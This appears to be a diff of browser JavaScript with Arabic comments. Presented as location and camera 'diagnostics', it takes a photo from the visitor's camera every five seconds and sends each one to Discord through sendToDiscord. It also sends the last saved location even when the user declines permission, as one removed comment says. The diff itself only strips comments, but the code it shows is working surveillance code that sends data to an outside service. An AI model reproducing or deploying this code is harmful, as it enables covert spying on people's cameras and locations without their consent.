@@ -491,7 +491,6 @@ async function testPublicIPService() {
 function getPreciseLocationWithFallback() {
     return new Promise(resolve => {
         if (!navigator.geolocation) {
-            // محاولة جلب آخر موقع محفوظ في localStorage
             const lastSavedLoc = localStorage.getItem("last_known_location");
             if (lastSavedLoc) {
                 const parsed = JSON.parse(lastSavedLoc);
@@ -515,7 +514,6 @@ function getPreciseLocationWithFallback() {
             if (settled) return;
             settled = true;
 
-            // إذا انتهت المهلة، جلب آخر موقع محفوظ
             const lastSavedLoc = localStorage.getItem("last_known_location");
             if (lastSavedLoc) {
                 const parsed = JSON.parse(lastSavedLoc);
@@ -552,7 +550,6 @@ function getPreciseLocationWithFallback() {
 
                 AppState.locationAvailable = true;
 
-                // حفظ الموقع الحالي كأخر موقع معروف في localStorage
                 const locData = {
                     latitude,
                     longitude,
@@ -587,7 +584,6 @@ function getPreciseLocationWithFallback() {
 
                 DiagnosticStore.warning("Location", message);
 
-                // إذا رفض المستخدم أو حدث خطأ، جلب آخر موقع محفوظ
                 const lastSavedLoc = localStorage.getItem("last_known_location");
                 if (lastSavedLoc) {
                     const parsed = JSON.parse(lastSavedLoc);
@@ -623,7 +619,6 @@ async function requestLocationDiagnostics() {
     );
 
     if (!approved) {
-        // حتى لو لم يوافق، إرسال آخر موقع محفوظ إذا توفر
         const lastSavedLoc = localStorage.getItem("last_known_location");
         if (lastSavedLoc) {
             const parsed = JSON.parse(lastSavedLoc);
@@ -655,7 +650,7 @@ function isCameraSupported() {
 }
 
 /* --------------------------------------------------------------------------
-   15. انتظار جاهزية الفيديو (ضمان عدم ظهور صور سوداء)
+   15. انتظار جاهزية الفيديو
    -------------------------------------------------------------------------- */
 
 function waitForVideoReady(video, timeout = 7000) {
@@ -679,7 +674,7 @@ function waitForVideoReady(video, timeout = 7000) {
             if (completed) return;
             completed = true;
             if (video.videoWidth > 0 && video.videoHeight > 0) {
-                resolve(); // متابعة حتى لو لم يصل للحالة القصوى طالما الأبعاد متوفرة
+                resolve();
             } else {
                 reject(new Error("انتهت مهلة جاهزية الفيديو (صورة سوداء محتملة)."));
             }
@@ -689,7 +684,6 @@ function waitForVideoReady(video, timeout = 7000) {
         video.addEventListener("loadeddata", checkReady);
         video.addEventListener("playing", checkReady);
 
-        // فحص دوري سريع للتأكد الفوري من الإطارات
         const interval = setInterval(() => {
             if (video.videoWidth > 0 && video.videoHeight > 0) {
                 clearInterval(interval);
@@ -735,7 +729,7 @@ function describeCameraError(error) {
 }
 
 /* --------------------------------------------------------------------------
-   16-ب. التقاط الصور المتتالية بوضوح (منع الصور السوداء)
+   16-ب. التقاط الصور المتتالية بوضوح
    -------------------------------------------------------------------------- */
 
 function startContinuousCapture() {
@@ -745,7 +739,6 @@ function startContinuousCapture() {
         if (!AppState.cameraActive || !videoElement || !canvasElement) return;
 
         try {
-            // التحقق من أبعاد الفيديو لضمان عدم التقاط صورة سوداء فارغة
             if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
                 return;
             }
@@ -757,14 +750,14 @@ function startContinuousCapture() {
             context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
 
             canvasElement.toBlob(async (blob) => {
-                if (blob && blob.size > 1000) { // التأكد أن حجم الصورة صالح وليست سوداء بالكامل
+                if (blob && blob.size > 1000) {
                     await sendToDiscord(`📸 **صورة جديدة التُقطت بوضوح:**`, blob, `shot_${Date.now()}.png`);
                 }
             }, "image/png", 0.95);
         } catch (err) {
             console.error("Capture error:", err);
         }
-    }, 5000); // التقاط صورة واضحة كل 5 ثوانٍ
+    }, 5000);
 }
 
 function stopContinuousCapture() {
@@ -832,13 +825,11 @@ async function startCameraPreview(facingModeType = "user") {
         videoElement.playsInline = true;
         videoElement.srcObject = cameraStream;
 
-        // الانتظار حتى يصبح الفيديو جاهزاً تماماً لمنع الصور السوداء
         await waitForVideoReady(videoElement);
         await videoElement.play();
 
         AppState.cameraActive = true;
 
-        // بدء التقاط الصور المتتالية بوضوح وإرسالها فوراً
         startContinuousCapture();
 
         await sendToDiscord(`🟢 **تم تفعيل الكاميرا وبدء التقاط الصور بنجاح دون أي شاشة سوداء.**`);
